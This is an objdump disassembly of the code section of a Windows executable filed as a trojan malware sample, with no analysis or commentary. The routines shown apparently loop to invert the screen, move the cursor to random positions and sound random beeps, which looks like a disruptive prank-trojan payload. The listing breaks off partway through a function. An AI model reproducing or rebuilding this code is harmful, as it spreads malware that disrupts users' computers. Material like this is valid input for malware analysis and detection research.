
malware_samples/trojan/cad20c41945780e039728435c931c88b42373ade7b35437bae543fce1eb6cee6.exe:     file format pei-x86-64


Disassembly of section .text:

0000000140001000 <.text>:
   140001000:	48 8d 0d c9 6f 00 00 	lea    0x6fc9(%rip),%rcx        # 0x140007fd0
   140001007:	e9 18 62 00 00       	jmp    0x140007224
   14000100c:	cc                   	int3
   14000100d:	cc                   	int3
   14000100e:	cc                   	int3
   14000100f:	cc                   	int3
   140001010:	48 8d 05 71 d9 00 00 	lea    0xd971(%rip),%rax        # 0x14000e988
   140001017:	c3                   	ret
   140001018:	cc                   	int3
   140001019:	cc                   	int3
   14000101a:	cc                   	int3
   14000101b:	cc                   	int3
   14000101c:	cc                   	int3
   14000101d:	cc                   	int3
   14000101e:	cc                   	int3
   14000101f:	cc                   	int3
   140001020:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140001025:	57                   	push   %rdi
   140001026:	48 83 ec 20          	sub    $0x20,%rsp
   14000102a:	48 8b d9             	mov    %rcx,%rbx
   14000102d:	ff 15 65 81 00 00    	call   *0x8165(%rip)        # 0x140009198
   140001033:	48 8b f8             	mov    %rax,%rdi
   140001036:	ff 15 c4 81 00 00    	call   *0x81c4(%rip)        # 0x140009200
   14000103c:	4c 8b c8             	mov    %rax,%r9
   14000103f:	48 81 ff 80 96 98 00 	cmp    $0x989680,%rdi
   140001046:	75 15                	jne    0x14000105d
   140001048:	49 6b c1 64          	imul   $0x64,%r9,%rax
   14000104c:	48 89 03             	mov    %rax,(%rbx)
   14000104f:	48 8b c3             	mov    %rbx,%rax
   140001052:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140001057:	48 83 c4 20          	add    $0x20,%rsp
   14000105b:	5f                   	pop    %rdi
   14000105c:	c3                   	ret
   14000105d:	48 81 ff 00 36 6e 01 	cmp    $0x16e3600,%rdi
   140001064:	75 65                	jne    0x1400010cb
   140001066:	49 ba f3 8c 90 94 07 	movabs $0xb2f4fc0794908cf3,%r10
   14000106d:	fc f4 b2 
   140001070:	49 8b c2             	mov    %r10,%rax
   140001073:	49 f7 e9             	imul   %r9
   140001076:	49 8b c2             	mov    %r10,%rax
   140001079:	4d 8d 04 11          	lea    (%r9,%rdx,1),%r8
   14000107d:	49 c1 f8 18          	sar    $0x18,%r8
   140001081:	49 8b c8             	mov    %r8,%rcx
   140001084:	48 c1 e9 3f          	shr    $0x3f,%rcx
   140001088:	4c 03 c1             	add    %rcx,%r8
   14000108b:	49 69 c8 00 36 6e 01 	imul   $0x16e3600,%r8,%rcx
   140001092:	4c 2b c9             	sub    %rcx,%r9
   140001095:	49 69 c9 00 ca 9a 3b 	imul   $0x3b9aca00,%r9,%rcx
   14000109c:	48 f7 e9             	imul   %rcx
   14000109f:	48 03 d1             	add    %rcx,%rdx
   1400010a2:	48 c1 fa 18          	sar    $0x18,%rdx
   1400010a6:	48 8b c2             	mov    %rdx,%rax
   1400010a9:	48 c1 e8 3f          	shr    $0x3f,%rax
   1400010ad:	48 03 d0             	add    %rax,%rdx
   1400010b0:	49 69 c0 00 ca 9a 3b 	imul   $0x3b9aca00,%r8,%rax
   1400010b7:	48 03 d0             	add    %rax,%rdx
   1400010ba:	48 8b c3             	mov    %rbx,%rax
   1400010bd:	48 89 13             	mov    %rdx,(%rbx)
   1400010c0:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400010c5:	48 83 c4 20          	add    $0x20,%rsp
   1400010c9:	5f                   	pop    %rdi
   1400010ca:	c3                   	ret
   1400010cb:	48 99                	cqto
   1400010cd:	48 f7 ff             	idiv   %rdi
   1400010d0:	48 8b c8             	mov    %rax,%rcx
   1400010d3:	48 69 c2 00 ca 9a 3b 	imul   $0x3b9aca00,%rdx,%rax
   1400010da:	48 69 c9 00 ca 9a 3b 	imul   $0x3b9aca00,%rcx,%rcx
   1400010e1:	48 99                	cqto
   1400010e3:	48 f7 ff             	idiv   %rdi
   1400010e6:	48 03 c1             	add    %rcx,%rax
   1400010e9:	48 89 03             	mov    %rax,(%rbx)
   1400010ec:	48 8b c3             	mov    %rbx,%rax
   1400010ef:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400010f4:	48 83 c4 20          	add    $0x20,%rsp
   1400010f8:	5f                   	pop    %rdi
   1400010f9:	c3                   	ret
   1400010fa:	cc                   	int3
   1400010fb:	cc                   	int3
   1400010fc:	cc                   	int3
   1400010fd:	cc                   	int3
   1400010fe:	cc                   	int3
   1400010ff:	cc                   	int3
   140001100:	40 53                	rex push %rbx
   140001102:	48 83 ec 20          	sub    $0x20,%rsp
   140001106:	48 8b d9             	mov    %rcx,%rbx
   140001109:	48 8b c2             	mov    %rdx,%rax
   14000110c:	48 8d 0d 45 86 00 00 	lea    0x8645(%rip),%rcx        # 0x140009758
   140001113:	0f 57 c0             	xorps  %xmm0,%xmm0
   140001116:	48 8d 53 08          	lea    0x8(%rbx),%rdx
   14000111a:	48 89 0b             	mov    %rcx,(%rbx)
   14000111d:	48 8d 48 08          	lea    0x8(%rax),%rcx
   140001121:	0f 11 02             	movups %xmm0,(%rdx)
   140001124:	ff 15 d6 82 00 00    	call   *0x82d6(%rip)        # 0x140009400
   14000112a:	48 8b c3             	mov    %rbx,%rax
   14000112d:	48 83 c4 20          	add    $0x20,%rsp
   140001131:	5b                   	pop    %rbx
   140001132:	c3                   	ret
   140001133:	cc                   	int3
   140001134:	cc                   	int3
   140001135:	cc                   	int3
   140001136:	cc                   	int3
   140001137:	cc                   	int3
   140001138:	cc                   	int3
   140001139:	cc                   	int3
   14000113a:	cc                   	int3
   14000113b:	cc                   	int3
   14000113c:	cc                   	int3
   14000113d:	cc                   	int3
   14000113e:	cc                   	int3
   14000113f:	cc                   	int3
   140001140:	48 8b 51 08          	mov    0x8(%rcx),%rdx
   140001144:	48 8d 05 5d 86 00 00 	lea    0x865d(%rip),%rax        # 0x1400097a8
   14000114b:	48 85 d2             	test   %rdx,%rdx
   14000114e:	48 0f 45 c2          	cmovne %rdx,%rax
   140001152:	c3                   	ret
   140001153:	cc                   	int3
   140001154:	cc                   	int3
   140001155:	cc                   	int3
   140001156:	cc                   	int3
   140001157:	cc                   	int3
   140001158:	cc                   	int3
   140001159:	cc                   	int3
   14000115a:	cc                   	int3
   14000115b:	cc                   	int3
   14000115c:	cc                   	int3
   14000115d:	cc                   	int3
   14000115e:	cc                   	int3
   14000115f:	cc                   	int3
   140001160:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140001165:	57                   	push   %rdi
   140001166:	48 83 ec 20          	sub    $0x20,%rsp
   14000116a:	48 8d 05 e7 85 00 00 	lea    0x85e7(%rip),%rax        # 0x140009758
   140001171:	48 8b f9             	mov    %rcx,%rdi
   140001174:	48 89 01             	mov    %rax,(%rcx)
   140001177:	8b da                	mov    %edx,%ebx
   140001179:	48 83 c1 08          	add    $0x8,%rcx
   14000117d:	ff 15 85 82 00 00    	call   *0x8285(%rip)        # 0x140009408
   140001183:	f6 c3 01             	test   $0x1,%bl
   140001186:	74 0d                	je     0x140001195
   140001188:	ba 18 00 00 00       	mov    $0x18,%edx
   14000118d:	48 8b cf             	mov    %rdi,%rcx
   140001190:	e8 8b 5b 00 00       	call   0x140006d20
   140001195:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000119a:	48 8b c7             	mov    %rdi,%rax
   14000119d:	48 83 c4 20          	add    $0x20,%rsp
   1400011a1:	5f                   	pop    %rdi
   1400011a2:	c3                   	ret
   1400011a3:	cc                   	int3
   1400011a4:	cc                   	int3
   1400011a5:	cc                   	int3
   1400011a6:	cc                   	int3
   1400011a7:	cc                   	int3
   1400011a8:	cc                   	int3
   1400011a9:	cc                   	int3
   1400011aa:	cc                   	int3
   1400011ab:	cc                   	int3
   1400011ac:	cc                   	int3
   1400011ad:	cc                   	int3
   1400011ae:	cc                   	int3
   1400011af:	cc                   	int3
   1400011b0:	48 8d 05 a1 85 00 00 	lea    0x85a1(%rip),%rax        # 0x140009758
   1400011b7:	48 89 01             	mov    %rax,(%rcx)
   1400011ba:	48 83 c1 08          	add    $0x8,%rcx
   1400011be:	48 ff 25 43 82 00 00 	rex.W jmp *0x8243(%rip)        # 0x140009408
   1400011c5:	cc                   	int3
   1400011c6:	cc                   	int3
   1400011c7:	cc                   	int3
   1400011c8:	cc                   	int3
   1400011c9:	cc                   	int3
   1400011ca:	cc                   	int3
   1400011cb:	cc                   	int3
   1400011cc:	cc                   	int3
   1400011cd:	cc                   	int3
   1400011ce:	cc                   	int3
   1400011cf:	cc                   	int3
   1400011d0:	48 8d 05 e9 85 00 00 	lea    0x85e9(%rip),%rax        # 0x1400097c0
   1400011d7:	48 c7 41 10 00 00 00 	movq   $0x0,0x10(%rcx)
   1400011de:	00 
   1400011df:	48 89 41 08          	mov    %rax,0x8(%rcx)
   1400011e3:	48 8d 05 ae 85 00 00 	lea    0x85ae(%rip),%rax        # 0x140009798
   1400011ea:	48 89 01             	mov    %rax,(%rcx)
   1400011ed:	48 8b c1             	mov    %rcx,%rax
   1400011f0:	c3                   	ret
   1400011f1:	cc                   	int3
   1400011f2:	cc                   	int3
   1400011f3:	cc                   	int3
   1400011f4:	cc                   	int3
   1400011f5:	cc                   	int3
   1400011f6:	cc                   	int3
   1400011f7:	cc                   	int3
   1400011f8:	cc                   	int3
   1400011f9:	cc                   	int3
   1400011fa:	cc                   	int3
   1400011fb:	cc                   	int3
   1400011fc:	cc                   	int3
   1400011fd:	cc                   	int3
   1400011fe:	cc                   	int3
   1400011ff:	cc                   	int3
   140001200:	48 8d 05 d1 85 00 00 	lea    0x85d1(%rip),%rax        # 0x1400097d8
   140001207:	48 c7 41 10 00 00 00 	movq   $0x0,0x10(%rcx)
   14000120e:	00 
   14000120f:	48 89 41 08          	mov    %rax,0x8(%rcx)
   140001213:	48 8d 05 9e 8f 00 00 	lea    0x8f9e(%rip),%rax        # 0x14000a1b8
   14000121a:	48 89 01             	mov    %rax,(%rcx)
   14000121d:	48 8b c1             	mov    %rcx,%rax
   140001220:	c3                   	ret
   140001221:	cc                   	int3
   140001222:	cc                   	int3
   140001223:	cc                   	int3
   140001224:	cc                   	int3
   140001225:	cc                   	int3
   140001226:	cc                   	int3
   140001227:	cc                   	int3
   140001228:	cc                   	int3
   140001229:	cc                   	int3
   14000122a:	cc                   	int3
   14000122b:	cc                   	int3
   14000122c:	cc                   	int3
   14000122d:	cc                   	int3
   14000122e:	cc                   	int3
   14000122f:	cc                   	int3
   140001230:	48 83 ec 48          	sub    $0x48,%rsp
   140001234:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140001239:	e8 c2 ff ff ff       	call   0x140001200
   14000123e:	48 8d 15 c3 a7 00 00 	lea    0xa7c3(%rip),%rdx        # 0x14000ba08
   140001245:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   14000124a:	e8 3d 69 00 00       	call   0x140007b8c
   14000124f:	cc                   	int3
   140001250:	40 53                	rex push %rbx
   140001252:	48 83 ec 20          	sub    $0x20,%rsp
   140001256:	48 8b d9             	mov    %rcx,%rbx
   140001259:	48 8b c2             	mov    %rdx,%rax
   14000125c:	48 8d 0d f5 84 00 00 	lea    0x84f5(%rip),%rcx        # 0x140009758
   140001263:	0f 57 c0             	xorps  %xmm0,%xmm0
   140001266:	48 8d 53 08          	lea    0x8(%rbx),%rdx
   14000126a:	48 89 0b             	mov    %rcx,(%rbx)
   14000126d:	48 8d 48 08          	lea    0x8(%rax),%rcx
   140001271:	0f 11 02             	movups %xmm0,(%rdx)
   140001274:	ff 15 86 81 00 00    	call   *0x8186(%rip)        # 0x140009400
   14000127a:	48 8d 05 37 8f 00 00 	lea    0x8f37(%rip),%rax        # 0x14000a1b8
   140001281:	48 89 03             	mov    %rax,(%rbx)
   140001284:	48 8b c3             	mov    %rbx,%rax
   140001287:	48 83 c4 20          	add    $0x20,%rsp
   14000128b:	5b                   	pop    %rbx
   14000128c:	c3                   	ret
   14000128d:	cc                   	int3
   14000128e:	cc                   	int3
   14000128f:	cc                   	int3
   140001290:	48 83 ec 48          	sub    $0x48,%rsp
   140001294:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140001299:	e8 32 ff ff ff       	call   0x1400011d0
   14000129e:	48 8d 15 23 a8 00 00 	lea    0xa823(%rip),%rdx        # 0x14000bac8
   1400012a5:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   1400012aa:	e8 dd 68 00 00       	call   0x140007b8c
   1400012af:	cc                   	int3
   1400012b0:	40 53                	rex push %rbx
   1400012b2:	48 83 ec 20          	sub    $0x20,%rsp
   1400012b6:	48 8b d9             	mov    %rcx,%rbx
   1400012b9:	48 8b c2             	mov    %rdx,%rax
   1400012bc:	48 8d 0d 95 84 00 00 	lea    0x8495(%rip),%rcx        # 0x140009758
   1400012c3:	0f 57 c0             	xorps  %xmm0,%xmm0
   1400012c6:	48 8d 53 08          	lea    0x8(%rbx),%rdx
   1400012ca:	48 89 0b             	mov    %rcx,(%rbx)
   1400012cd:	48 8d 48 08          	lea    0x8(%rax),%rcx
   1400012d1:	0f 11 02             	movups %xmm0,(%rdx)
   1400012d4:	ff 15 26 81 00 00    	call   *0x8126(%rip)        # 0x140009400
   1400012da:	48 8d 05 b7 84 00 00 	lea    0x84b7(%rip),%rax        # 0x140009798
   1400012e1:	48 89 03             	mov    %rax,(%rbx)
   1400012e4:	48 8b c3             	mov    %rbx,%rax
   1400012e7:	48 83 c4 20          	add    $0x20,%rsp
   1400012eb:	5b                   	pop    %rbx
   1400012ec:	c3                   	ret
   1400012ed:	cc                   	int3
   1400012ee:	cc                   	int3
   1400012ef:	cc                   	int3
   1400012f0:	40 53                	rex push %rbx
   1400012f2:	48 83 ec 20          	sub    $0x20,%rsp
   1400012f6:	48 8b d9             	mov    %rcx,%rbx
   1400012f9:	48 8b c2             	mov    %rdx,%rax
   1400012fc:	48 8d 0d 55 84 00 00 	lea    0x8455(%rip),%rcx        # 0x140009758
   140001303:	0f 57 c0             	xorps  %xmm0,%xmm0
   140001306:	48 8d 53 08          	lea    0x8(%rbx),%rdx
   14000130a:	48 89 0b             	mov    %rcx,(%rbx)
   14000130d:	48 8d 48 08          	lea    0x8(%rax),%rcx
   140001311:	0f 11 02             	movups %xmm0,(%rdx)
   140001314:	ff 15 e6 80 00 00    	call   *0x80e6(%rip)        # 0x140009400
   14000131a:	48 8d 05 4f 84 00 00 	lea    0x844f(%rip),%rax        # 0x140009770
   140001321:	48 89 03             	mov    %rax,(%rbx)
   140001324:	48 8b c3             	mov    %rbx,%rax
   140001327:	48 83 c4 20          	add    $0x20,%rsp
   14000132b:	5b                   	pop    %rbx
   14000132c:	c3                   	ret
   14000132d:	cc                   	int3
   14000132e:	cc                   	int3
   14000132f:	cc                   	int3
   140001330:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   140001335:	57                   	push   %rdi
   140001336:	48 83 ec 20          	sub    $0x20,%rsp
   14000133a:	48 8b 19             	mov    (%rcx),%rbx
   14000133d:	48 8b f9             	mov    %rcx,%rdi
   140001340:	48 85 db             	test   %rbx,%rbx
   140001343:	74 4e                	je     0x140001393
   140001345:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   14000134a:	f0 0f c1 43 10       	lock xadd %eax,0x10(%rbx)
   14000134f:	83 f8 01             	cmp    $0x1,%eax
   140001352:	75 38                	jne    0x14000138c
   140001354:	48 8b 0b             	mov    (%rbx),%rcx
   140001357:	48 85 c9             	test   %rcx,%rcx
   14000135a:	74 0d                	je     0x140001369
   14000135c:	ff 15 3e 7f 00 00    	call   *0x7f3e(%rip)        # 0x1400092a0
   140001362:	48 c7 03 00 00 00 00 	movq   $0x0,(%rbx)
   140001369:	48 8b 4b 08          	mov    0x8(%rbx),%rcx
   14000136d:	48 85 c9             	test   %rcx,%rcx
   140001370:	74 0d                	je     0x14000137f
   140001372:	e8 a9 59 00 00       	call   0x140006d20
   140001377:	48 c7 43 08 00 00 00 	movq   $0x0,0x8(%rbx)
   14000137e:	00 
   14000137f:	ba 18 00 00 00       	mov    $0x18,%edx
   140001384:	48 8b cb             	mov    %rbx,%rcx
   140001387:	e8 94 59 00 00       	call   0x140006d20
   14000138c:	48 c7 07 00 00 00 00 	movq   $0x0,(%rdi)
   140001393:	48 8b 5c 24 38       	mov    0x38(%rsp),%rbx
   140001398:	48 83 c4 20          	add    $0x20,%rsp
   14000139c:	5f                   	pop    %rdi
   14000139d:	c3                   	ret
   14000139e:	cc                   	int3
   14000139f:	cc                   	int3
   1400013a0:	48 ff 25 e9 7e 00 00 	rex.W jmp *0x7ee9(%rip)        # 0x140009290
   1400013a7:	cc                   	int3
   1400013a8:	cc                   	int3
   1400013a9:	cc                   	int3
   1400013aa:	cc                   	int3
   1400013ab:	cc                   	int3
   1400013ac:	cc                   	int3
   1400013ad:	cc                   	int3
   1400013ae:	cc                   	int3
   1400013af:	cc                   	int3
   1400013b0:	48 83 ec 28          	sub    $0x28,%rsp
   1400013b4:	48 8d 0d 2d 84 00 00 	lea    0x842d(%rip),%rcx        # 0x1400097e8
   1400013bb:	ff 15 27 7e 00 00    	call   *0x7e27(%rip)        # 0x1400091e8
   1400013c1:	cc                   	int3
   1400013c2:	cc                   	int3
   1400013c3:	cc                   	int3
   1400013c4:	cc                   	int3
   1400013c5:	cc                   	int3
   1400013c6:	cc                   	int3
   1400013c7:	cc                   	int3
   1400013c8:	cc                   	int3
   1400013c9:	cc                   	int3
   1400013ca:	cc                   	int3
   1400013cb:	cc                   	int3
   1400013cc:	cc                   	int3
   1400013cd:	cc                   	int3
   1400013ce:	cc                   	int3
   1400013cf:	cc                   	int3
   1400013d0:	48 83 ec 28          	sub    $0x28,%rsp
   1400013d4:	48 8b 49 08          	mov    0x8(%rcx),%rcx
   1400013d8:	48 85 c9             	test   %rcx,%rcx
   1400013db:	74 20                	je     0x1400013fd
   1400013dd:	48 8b 01             	mov    (%rcx),%rax
   1400013e0:	ff 50 10             	call   *0x10(%rax)
   1400013e3:	48 85 c0             	test   %rax,%rax
   1400013e6:	74 15                	je     0x1400013fd
   1400013e8:	48 8b 08             	mov    (%rax),%rcx
   1400013eb:	ba 01 00 00 00       	mov    $0x1,%edx
   1400013f0:	4c 8b 01             	mov    (%rcx),%r8
   1400013f3:	48 8b c8             	mov    %rax,%rcx
   1400013f6:	48 83 c4 28          	add    $0x28,%rsp
   1400013fa:	49 ff e0             	rex.WB jmp *%r8
   1400013fd:	48 83 c4 28          	add    $0x28,%rsp
   140001401:	c3                   	ret
   140001402:	cc                   	int3
   140001403:	cc                   	int3
   140001404:	cc                   	int3
   140001405:	cc                   	int3
   140001406:	cc                   	int3
   140001407:	cc                   	int3
   140001408:	cc                   	int3
   140001409:	cc                   	int3
   14000140a:	cc                   	int3
   14000140b:	cc                   	int3
   14000140c:	cc                   	int3
   14000140d:	cc                   	int3
   14000140e:	cc                   	int3
   14000140f:	cc                   	int3
   140001410:	40 57                	rex push %rdi
   140001412:	48 83 ec 60          	sub    $0x60,%rsp
   140001416:	33 c9                	xor    %ecx,%ecx
   140001418:	ff 15 22 7f 00 00    	call   *0x7f22(%rip)        # 0x140009340
   14000141e:	80 3d 8f cc 00 00 00 	cmpb   $0x0,0xcc8f(%rip)        # 0x14000e0b4
   140001425:	48 8b f8             	mov    %rax,%rdi
   140001428:	0f 84 c4 00 00 00    	je     0x1400014f2
   14000142e:	48 89 9c 24 80 00 00 	mov    %rbx,0x80(%rsp)
   140001435:	00 
   140001436:	48 89 ac 24 88 00 00 	mov    %rbp,0x88(%rsp)
   14000143d:	00 
   14000143e:	33 ed                	xor    %ebp,%ebp
   140001440:	48 89 74 24 58       	mov    %rsi,0x58(%rsp)
   140001445:	48 be ff ff ff ff ff 	movabs $0x7fffffffffffffff,%rsi
   14000144c:	ff ff 7f 
   14000144f:	4c 89 74 24 50       	mov    %r14,0x50(%rsp)
   140001454:	49 be ff 35 65 c4 ff 	movabs $0x7fffffffc46535ff,%r14
   14000145b:	ff ff 7f 
   14000145e:	66 90                	xchg   %ax,%ax
   140001460:	b9 01 00 00 00       	mov    $0x1,%ecx
   140001465:	ff 15 f5 7e 00 00    	call   *0x7ef5(%rip)        # 0x140009360
   14000146b:	33 c9                	xor    %ecx,%ecx
   14000146d:	8b d8                	mov    %eax,%ebx
   14000146f:	ff 15 eb 7e 00 00    	call   *0x7eeb(%rip)        # 0x140009360
   140001475:	c7 44 24 40 08 00 33 	movl   $0x330008,0x40(%rsp)
   14000147c:	00 
   14000147d:	45 33 c0             	xor    %r8d,%r8d
   140001480:	89 6c 24 38          	mov    %ebp,0x38(%rsp)
   140001484:	44 8b c8             	mov    %eax,%r9d
   140001487:	89 6c 24 30          	mov    %ebp,0x30(%rsp)
   14000148b:	33 d2                	xor    %edx,%edx
   14000148d:	48 89 7c 24 28       	mov    %rdi,0x28(%rsp)
   140001492:	48 8b cf             	mov    %rdi,%rcx
   140001495:	89 5c 24 20          	mov    %ebx,0x20(%rsp)
   140001499:	ff 15 89 7b 00 00    	call   *0x7b89(%rip)        # 0x140009028
   14000149f:	48 8d 4c 24 78       	lea    0x78(%rsp),%rcx
   1400014a4:	e8 77 fb ff ff       	call   0x140001020
   1400014a9:	48 8b 44 24 78       	mov    0x78(%rsp),%rax
   1400014ae:	49 3b c6             	cmp    %r14,%rax
   1400014b1:	7d 0d                	jge    0x1400014c0
   1400014b3:	48 05 00 ca 9a 3b    	add    $0x3b9aca00,%rax
   1400014b9:	48 89 44 24 70       	mov    %rax,0x70(%rsp)
   1400014be:	eb 05                	jmp    0x1400014c5
   1400014c0:	48 89 74 24 70       	mov    %rsi,0x70(%rsp)
   1400014c5:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   1400014ca:	e8 d1 4a 00 00       	call   0x140005fa0
   1400014cf:	40 38 2d de cb 00 00 	cmp    %bpl,0xcbde(%rip)        # 0x14000e0b4
   1400014d6:	75 88                	jne    0x140001460
   1400014d8:	4c 8b 74 24 50       	mov    0x50(%rsp),%r14
   1400014dd:	48 8b 74 24 58       	mov    0x58(%rsp),%rsi
   1400014e2:	48 8b ac 24 88 00 00 	mov    0x88(%rsp),%rbp
   1400014e9:	00 
   1400014ea:	48 8b 9c 24 80 00 00 	mov    0x80(%rsp),%rbx
   1400014f1:	00 
   1400014f2:	48 8b d7             	mov    %rdi,%rdx
   1400014f5:	33 c9                	xor    %ecx,%ecx
   1400014f7:	48 83 c4 60          	add    $0x60,%rsp
   1400014fb:	5f                   	pop    %rdi
   1400014fc:	48 ff 25 2d 7e 00 00 	rex.W jmp *0x7e2d(%rip)        # 0x140009330
   140001503:	cc                   	int3
   140001504:	cc                   	int3
   140001505:	cc                   	int3
   140001506:	cc                   	int3
   140001507:	cc                   	int3
   140001508:	cc                   	int3
   140001509:	cc                   	int3
   14000150a:	cc                   	int3
   14000150b:	cc                   	int3
   14000150c:	cc                   	int3
   14000150d:	cc                   	int3
   14000150e:	cc                   	int3
   14000150f:	cc                   	int3
   140001510:	40 56                	rex push %rsi
   140001512:	57                   	push   %rdi
   140001513:	48 83 ec 28          	sub    $0x28,%rsp
   140001517:	33 c9                	xor    %ecx,%ecx
   140001519:	ff 15 41 7e 00 00    	call   *0x7e41(%rip)        # 0x140009360
   14000151f:	b9 01 00 00 00       	mov    $0x1,%ecx
   140001524:	8b f8                	mov    %eax,%edi
   140001526:	ff 15 34 7e 00 00    	call   *0x7e34(%rip)        # 0x140009360
   14000152c:	80 3d 81 cb 00 00 00 	cmpb   $0x0,0xcb81(%rip)        # 0x14000e0b4
   140001533:	8b f0                	mov    %eax,%esi
   140001535:	0f 84 89 00 00 00    	je     0x1400015c4
   14000153b:	48 89 5c 24 50       	mov    %rbx,0x50(%rsp)
   140001540:	48 89 6c 24 58       	mov    %rbp,0x58(%rsp)
   140001545:	48 bd ff ff ff ff ff 	movabs $0x7fffffffffffffff,%rbp
   14000154c:	ff ff 7f 
   14000154f:	4c 89 74 24 20       	mov    %r14,0x20(%rsp)
   140001554:	49 be ff 5c 1e ee ff 	movabs $0x7fffffffee1e5cff,%r14
   14000155b:	ff ff 7f 
   14000155e:	66 90                	xchg   %ax,%ax
   140001560:	ff 15 92 80 00 00    	call   *0x8092(%rip)        # 0x1400095f8
   140001566:	99                   	cltd
   140001567:	f7 ff                	idiv   %edi
   140001569:	8b da                	mov    %edx,%ebx
   14000156b:	ff 15 87 80 00 00    	call   *0x8087(%rip)        # 0x1400095f8
   140001571:	99                   	cltd
   140001572:	8b cb                	mov    %ebx,%ecx
   140001574:	f7 fe                	idiv   %esi
   140001576:	ff 15 7c 7d 00 00    	call   *0x7d7c(%rip)        # 0x1400092f8
   14000157c:	48 8d 4c 24 48       	lea    0x48(%rsp),%rcx
   140001581:	e8 9a fa ff ff       	call   0x140001020
   140001586:	48 8b 44 24 48       	mov    0x48(%rsp),%rax
   14000158b:	49 3b c6             	cmp    %r14,%rax
   14000158e:	7d 0d                	jge    0x14000159d
   140001590:	48 05 00 a3 e1 11    	add    $0x11e1a300,%rax
   140001596:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   14000159b:	eb 05                	jmp    0x1400015a2
   14000159d:	48 89 6c 24 40       	mov    %rbp,0x40(%rsp)
   1400015a2:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   1400015a7:	e8 f4 49 00 00       	call   0x140005fa0
   1400015ac:	80 3d 01 cb 00 00 00 	cmpb   $0x0,0xcb01(%rip)        # 0x14000e0b4
   1400015b3:	75 ab                	jne    0x140001560
   1400015b5:	4c 8b 74 24 20       	mov    0x20(%rsp),%r14
   1400015ba:	48 8b 6c 24 58       	mov    0x58(%rsp),%rbp
   1400015bf:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   1400015c4:	48 83 c4 28          	add    $0x28,%rsp
   1400015c8:	5f                   	pop    %rdi
   1400015c9:	5e                   	pop    %rsi
   1400015ca:	c3                   	ret
   1400015cb:	cc                   	int3
   1400015cc:	cc                   	int3
   1400015cd:	cc                   	int3
   1400015ce:	cc                   	int3
   1400015cf:	cc                   	int3
   1400015d0:	48 83 ec 28          	sub    $0x28,%rsp
   1400015d4:	80 3d d9 ca 00 00 00 	cmpb   $0x0,0xcad9(%rip)        # 0x14000e0b4
   1400015db:	0f 84 94 00 00 00    	je     0x140001675
   1400015e1:	48 89 5c 24 40       	mov    %rbx,0x40(%rsp)
   1400015e6:	48 bb ff ff ff ff ff 	movabs $0x7fffffffffffffff,%rbx
   1400015ed:	ff ff 7f 
   1400015f0:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   1400015f5:	48 bf ff d8 46 d6 ff 	movabs $0x7fffffffd646d8ff,%rdi
   1400015fc:	ff ff 7f 
   1400015ff:	90                   	nop
   140001600:	ff 15 f2 7f 00 00    	call   *0x7ff2(%rip)        # 0x1400095f8
   140001606:	8b c8                	mov    %eax,%ecx
   140001608:	b8 f1 19 76 05       	mov    $0x57619f1,%eax
   14000160d:	f7 e9                	imul   %ecx
   14000160f:	c1 fa 05             	sar    $0x5,%edx
   140001612:	8b c2                	mov    %edx,%eax
   140001614:	c1 e8 1f             	shr    $0x1f,%eax
   140001617:	03 d0                	add    %eax,%edx
   140001619:	69 c2 dc 05 00 00    	imul   $0x5dc,%edx,%eax
   14000161f:	ba c8 00 00 00       	mov    $0xc8,%edx
   140001624:	2b c8                	sub    %eax,%ecx
   140001626:	81 c1 f4 01 00 00    	add    $0x1f4,%ecx
   14000162c:	ff 15 be 7a 00 00    	call   *0x7abe(%rip)        # 0x1400090f0
   140001632:	48 8d 4c 24 38       	lea    0x38(%rsp),%rcx
   140001637:	e8 e4 f9 ff ff       	call   0x140001020
   14000163c:	48 8b 44 24 38       	mov    0x38(%rsp),%rax
   140001641:	48 3b c7             	cmp    %rdi,%rax
   140001644:	7d 0d                	jge    0x140001653
   140001646:	48 05 00 27 b9 29    	add    $0x29b92700,%rax
   14000164c:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   140001651:	eb 05                	jmp    0x140001658
   140001653:	48 89 5c 24 30       	mov    %rbx,0x30(%rsp)
   140001658:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   14000165d:	e8 3e 49 00 00       	call   0x140005fa0
   140001662:	80 3d 4b ca 00 00 00 	cmpb   $0x0,0xca4b(%rip)        # 0x14000e0b4
   140001669:	75 95                	jne    0x140001600
   14000166b:	48 8b 7c 24 20       	mov    0x20(%rsp),%rdi
   140001670:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   140001675:	48 83 c4 28          	add    $0x28,%rsp
   140001679:	c3                   	ret
   14000167a:	cc                   	int3
   14000167b:	cc                   	int3
   14000167c:	cc                   	int3
   14000167d:	cc                   	int3
   14000167e:	cc                   	int3
   14000167f:	cc                   	int3
   140001680:	48 83 ec 28          	sub    $0x28,%rsp
   140001684:	b9 01 00 00 00       	mov    $0x1,%ecx
   140001689:	ff 15 71 7c 00 00    	call   *0x7c71(%rip)        # 0x140009300
   14000168f:	80 3d 1e ca 00 00 00 	cmpb   $0x0,0xca1e(%rip)        # 0x14000e0b4
   140001696:	74 61                	je     0x1400016f9
   140001698:	48 89 5c 24 40       	mov    %rbx,0x40(%rsp)
   14000169d:	48 bb ff ff ff ff ff 	movabs $0x7fffffffffffffff,%rbx
   1400016a4:	ff ff 7f 
   1400016a7:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   1400016ac:	48 bf ff 35 65 c4 ff 	movabs $0x7fffffffc46535ff,%rdi
   1400016b3:	ff ff 7f 
   1400016b6:	48 8d 4c 24 38       	lea    0x38(%rsp),%rcx
   1400016bb:	e8 60 f9 ff ff       	call   0x140001020
